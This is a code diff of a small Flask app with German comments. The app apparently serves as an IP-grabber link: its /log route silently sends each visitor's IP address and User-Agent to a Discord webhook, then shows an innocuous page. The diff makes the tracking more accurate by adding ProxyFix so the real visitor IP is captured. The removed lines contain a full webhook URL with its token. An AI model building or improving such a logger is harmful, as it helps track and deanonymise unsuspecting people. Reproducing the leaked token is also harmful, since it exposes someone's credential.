@@ -1,24 +1,24 @@
-from flask import Flask, request, redirect, render_template
+from flask import Flask, request, render_template
 import requests
 import os
-import time
+from werkzeug.middleware.proxy_fix import ProxyFix
 
 app = Flask(__name__)
-WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0zdVMZLN5A9utw1oWapMWx0MLIKXYYKv551KmndGOKbITTiKO-Hc57evMT"
+
+# WICHTIG: Proxy-Fix aktivieren
+app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/..."
 
 @app.route('/log')
 def log_ip():
-    ip = request.remote_addr
+    ip = request.remote_addr          # sollte jetzt die echte IP sein
     user_agent = request.headers.get('User-Agent')
     data = {"content": f"**IP-LOG:** {ip} | {user_agent}"}
     try:
         r = requests.post(WEBHOOK_URL, json=data, timeout=10)
-        print("Webhook Status:", r.status_code)  # für Logs
+        print("Webhook Status:", r.status_code)
     except Exception as e:
         print("Error:", str(e))
-    return render_template('index.html')
-    time.sleep(2)
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    
+    return render_template('index.html')  # time.sleep danach entfernen, ist tot
